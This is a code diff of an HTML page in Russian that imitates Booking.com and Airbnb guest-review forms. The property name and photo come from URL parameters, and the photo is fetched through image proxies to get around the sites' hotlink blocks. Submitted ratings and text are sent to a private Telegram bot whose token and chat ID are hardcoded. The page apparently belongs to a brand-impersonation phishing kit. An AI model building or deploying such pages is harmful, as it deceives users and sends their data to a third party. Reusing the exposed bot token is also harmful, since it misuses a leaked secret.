@@ -69,7 +69,6 @@
         
         .mini-gallery { display: grid; grid-template-columns: repeat(4, 1fr); gap: 2px; padding: 2px; background: #fff; }
         .mini-img { width: 100%; height: 50px; object-fit: cover; cursor: pointer; opacity: 0.8; transition: 0.2s; }
-        .mini-img:hover { opacity: 1; }
 
         .prop-details { padding: 16px; border-top: 1px solid #e7e7e7; }
         .prop-details strong { display: block; margin-bottom: 4px; font-size: 15px; color: var(--b-link); cursor: pointer; }
@@ -83,19 +82,13 @@
         .adv-check { color: #008009; font-weight: bold; }
 
         .submit-btn { background: var(--b-link); color: #fff; border: none; padding: 12px 32px; font-size: 16px; font-weight: 500; border-radius: 4px; cursor: pointer; transition: 0.2s; }
-        .submit-btn:hover { background: #00489a; }
 
         /* --- AIRBNB --- */
         .abnb-wrap { max-width: 600px; margin: 0 auto; background: #fff; min-height: 100vh; padding: 40px 24px; box-sizing: border-box; }
-        .abnb-logo { height: 32px; margin-bottom: 40px; }
-        .abnb-logo svg { fill: var(--abnb-pink); height: 100%; }
-        .abnb-h1 { font-size: 32px; line-height: 36px; font-weight: 600; color: #222; margin-bottom: 8px; }
-        .abnb-sub { font-size: 18px; color: #717171; margin-bottom: 40px; }
         .abnb-stars { display: flex; gap: 12px; margin-bottom: 32px; }
         .abnb-star { width: 44px; height: 44px; cursor: pointer; fill: #DDDDDD; transition: 0.2s; }
         .abnb-star.active { fill: #FF385C; }
-        .abnb-label { font-size: 16px; font-weight: 600; margin-bottom: 16px; display: block; }
-        .abnb-textarea { width: 100%; border: 1px solid #B0B0B0; border-radius: 8px; padding: 16px; font-size: 16px; font-family: inherit; min-height: 140px; margin-bottom: 32px; box-sizing: border-box; }
+        .abnb-textarea { width: 100%; border: 1px solid #B0B0B0; border-radius: 8px; padding: 16px; font-size: 16px; min-height: 140px; margin-bottom: 32px; box-sizing: border-box; }
         .abnb-submit { background: var(--abnb-pink); color: #fff; border: none; padding: 14px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; }
 
         .preview-zone { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 15px; }
@@ -139,7 +132,7 @@
             </div>
 
             <div class="step-title"><div class="step-num">2</div><div class="step-text">Оцените этот вариант размещения:</div></div>
-            <div class="rating-grid" id="rating-container"></div>
+            <div id="rating-container" class="rating-grid"></div>
 
             <div class="thanks-bar" id="score-total" style="display:none; justify-content: space-between; align-items: center;">
                 <span style="font-weight:700; color: #008009;">Мы рассчитали общую оценку:</span>
@@ -158,9 +151,6 @@
                 </div>
             </div>
 
-            <span class="question-label">Заголовок отзыва:</span>
-            <input type="text" id="headline" placeholder="Вкратце о ваших впечатлениях" style="margin-bottom: 30px;">
-
             <div class="step-title"><div class="step-num">4</div><div class="step-text">Фотографии</div></div>
             <button class="pet-btn" style="max-width: 200px; border: 1px solid var(--b-border)" onclick="document.getElementById('file-b').click()">📸 Добавить фото</button>
             <input type="file" id="file-b" multiple style="display:none" onchange="preview(this, 'pre-b')">
@@ -175,9 +165,9 @@
     <div class="sidebar">
         <div class="prop-card">
             <div class="main-img-wrap">
+                <!-- referrerpolicy="no-referrer" помогает против 403 ошибки -->
                 <img id="side-img" src="" class="prop-img" referrerpolicy="no-referrer">
             </div>
-            <div class="mini-gallery" id="side-gallery"></div>
             <div class="prop-details">
                 <strong id="side-name">Загрузка...</strong>
                 <div class="prop-score">
@@ -186,31 +176,19 @@
                 </div>
             </div>
         </div>
-        <div class="sidebar-box">
-            <h3>В чем преимущества Booking.com?</h3>
-            <div class="advantage-item"><span class="adv-check">✓</span> 106 310 000 подлинных отзывов.</div>
-            <div class="advantage-item"><span class="adv-check">✓</span> Более 94 000 направлений.</div>
-            <div class="advantage-item"><span class="adv-check">✓</span> Гарантия лучшей цены.</div>
-        </div>
     </div>
 </div>
 
 <div id="view-airbnb">
     <div class="abnb-wrap">
-        <div class="abnb-logo">
-            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 1c2.008 0 3.463.963 4.751 3.269l.533 1.025c1.954 3.83 6.114 12.54 7.1 14.836l.145.353c.667 1.591.91 2.472.96 3.396l.01.415.001.228c0 4.062-2.877 6.478-6.357 6.478-2.224 0-4.556-1.258-6.709-3.386l-.257-.26-.172-.179h-.011l-.176.185c-2.044 2.1-4.392 3.415-6.425 3.593l-.273.015c-3.483 0-6.361-2.42-6.361-6.49 0-1.119.227-2.115.772-3.486l.154-.373c1.026-2.4 5.239-11.232 7.203-15.086l.512-1.003C12.553 1.962 14.004 1 16 1zm0 2c-1.232 0-2.181.605-3.053 2.17l-.546 1.07c-1.921 3.76-6.046 12.404-7.051 14.764l-.155.378c-.52 1.307-.714 2.14-.714 3.128 0 2.872 1.927 4.49 4.361 4.49 1.628 0 3.591-1.077 5.462-2.923l.115-.116.32-.338.337.337c1.93 1.914 3.992 3.012 5.672 3.039l.255.001c2.435 0 4.357-1.6 4.357-4.478 0-1.054-.22-2.006-.789-3.456l-.149-.364c-1.005-2.34-5.118-11.004-7.062-14.814l-.538-1.033C18.196 3.616 17.24 3 16 3zm.01 10.316a4.237 4.237 0 0 1 4.232 4.237 4.237 4.237 0 0 1-4.232 4.237 4.237 4.237 0 0 1-4.237-4.237 4.237 4.237 0 0 1 4.237-4.237zm0 2a2.237 2.237 0 0 0-2.237 2.237 2.237 2.237 0 0 0 2.237 2.237 2.237 2.237 0 0 0 2.232-2.237 2.237 2.237 0 0 0-2.232-2.237z"/></svg>
-        </div>
-        <h1 class="abnb-h1">Как прошла ваша поездка?</h1>
-        <p class="abnb-sub">Ваш отзыв поможет хозяину и будущим гостям.</p>
+        <h1 style="font-size: 32px; font-weight: 600;">Как прошла поездка?</h1>
         <div class="abnb-stars" id="a-star-row"></div>
-        <span class="abnb-label">Опишите ваши впечатления:</span>
-        <textarea id="abnb-text" class="abnb-textarea" placeholder="Что вам запомнилось?"></textarea>
-        <button class="abnb-submit" onclick="sendData('airbnb')">Отправить отзыв</button>
+        <textarea id="abnb-text" class="abnb-textarea" placeholder="Расскажите всем..."></textarea>
+        <button class="abnb-submit" onclick="sendData('airbnb')">Отправить</button>
     </div>
 </div>
 
 <script>
-    console.log("SCRIPT STARTED");
     const urlParams = new URLSearchParams(window.location.search);
     const platform = urlParams.get('platform') || 'booking';
     document.body.className = 'is-' + platform;
@@ -218,71 +196,30 @@
     const TG_TOKEN = '8755254010:AAEe5G3upx_Nk4rjuGZHgrXFvvDN_ZnXfRg';
     const CHAT_ID = '623203896';
 
-    // ФУНКЦИЯ ДЛЯ ЧИСТКИ ПАРАМЕТРОВ ИЗ URL
+    // ФУНКЦИЯ ДЛЯ ЧИСТКИ ПАРАМЕТРОВ
     function getCleanParam(name) {
         let raw = urlParams.get(name);
         if (!raw) return '';
-        // Декодируем дважды на случай сложного кодирования
         let decoded = decodeURIComponent(raw.replace(/\+/g, ' '));
-        try { return decodeURIComponent(decoded); } catch(e) { return decoded; }
+        if (name === 'photo') {
+            // Убираем протокол для прокси
+            return decoded.replace(/^https?:\/\//, '').split('?')[0];
+        }
+        return decoded;
     }
 
     const pName = getCleanParam('name') || 'Apartments';
-    const mainPhoto = getCleanParam('photo') || 'https://via.placeholder.com/600x400?text=No+Photo';
+    const photoPath = getCleanParam('photo');
 
-    console.log("MAIN PHOTO:", mainPhoto);
-
-   if(platform === 'booking') {
-        document.getElementById('h-name').innerText = `Ваш отзыв об объекте ${pName}`;
+    if(platform === 'booking') {
+        document.getElementById('h-name').innerText = pName;
         document.getElementById('side-name').innerText = pName;
-        const imgEl = document.getElementById('side-img');
-
-        // 1. Берем сырой URL
-        let rawPhoto = getCleanParam('photo');
         
-        // 2. Если пусто — ставим заглушку сразу
-        if(!rawPhoto || rawPhoto.includes('placeholder')) {
-            imgEl.src = "https://via.placeholder.com/600x400?text=No+Photo";
-        } else {
-            // 3. Очищаем URL от протоколов, чтобы прокси не путался
-            let cleanUrl = rawPhoto.replace(/^https?:\/\//, '');
-            
-            // 4. Используем агрессивный прокси wsrv.nl
-            // Он обходит большинство блокировок Referer
-            imgEl.src = `https://wsrv.nl/?url=${cleanUrl}&default=https://via.placeholder.com/600x400?text=Error+Loading`;
+        const imgEl = document.getElementById('side-img');
+        if (photoPath) {
+            // Используем wsrv.nl - самый мощный прокси для обхода 401/403 ошибок
+            imgEl.src = `https://wsrv.nl/?url=${photoPath}&w=600&output=jpg&default=https://via.placeholder.com/600x400?text=No+Photo`;
         }
-
-        // На случай, если даже прокси не справился
-        imgEl.onerror = () => {
-            if(!imgEl.src.includes('placeholder')) {
-                imgEl.src = "https://via.placeholder.com/600x400?text=Image+Blocked";
-            }
-        };
-
-// иногда Booking блочит → перезапрашиваем
-// 🔥 ЧИНИМ URL
-let cleanPhoto = mainPhoto;
-
-try {
-    cleanPhoto = decodeURIComponent(mainPhoto);
-} catch(e) {}
-
-cleanPhoto = cleanPhoto.replace(/^https?:\/\//, '');
-
-// 🔥 СОБИРАЕМ ПРОКСИ
-const proxied = "https://images.weserv.nl/?url=" + cleanPhoto;
-
-// 🔥 СТАВИМ
-imgEl.src = proxied;
-
-// fallback
-imgEl.onerror = () => {
-    imgEl.src = "https://via.placeholder.com/600x400?text=No+Image";
-};
-
-console.log("PHOTO:", mainPhoto);
-console.log("CLEAN:", cleanPhoto);
-console.log("PROXY:", proxied);
 
         const cats = [
             {id:'staff', n:'Персонал'}, {id:'serv', n:'Услуги'}, {id:'clean', n:'Чистота'},
@@ -313,11 +250,6 @@ console.log("PROXY:", proxied);
                 document.getElementById('final-val').innerText = (avg * 2.5).toFixed(1);
             }
         };
-        window.showThanks = (id) => document.getElementById('thanks-'+id).style.display = 'block';
-        window.setPet = (val) => {
-            document.getElementById('pet-yes').classList.toggle('active', val);
-            document.getElementById('pet-no').classList.toggle('active', !val);
-        };
     }
 
     // ЛОГИКА AIRBNB
@@ -331,6 +263,12 @@ console.log("PROXY:", proxied);
     window.setAStar = (v) => {
         aRating = v;
         document.querySelectorAll('.abnb-star').forEach(s => s.classList.toggle('active', s.dataset.v <= v));
+    };
+
+    window.showThanks = (id) => document.getElementById('thanks-'+id).style.display = 'block';
+    window.setPet = (val) => {
+        document.getElementById('pet-yes').classList.toggle('active', val);
+        document.getElementById('pet-no').classList.toggle('active', !val);
     };
 
     window.preview = (input, containerId) => {
@@ -353,12 +291,16 @@ console.log("PROXY:", proxied);
             msg += `⭐ Звезд: ${aRating}\n`;
             msg += `📝 Текст: ${document.getElementById('abnb-text').value}`;
         }
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-        });
-        alert("Спасибо! Отзыв отправлен.");
+        try {
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            });
+            alert("Спасибо! Отзыв отправлен.");
+        } catch (e) {
+            alert("Ошибка при отправке.");
+        }
     };
 </script>
 </body>
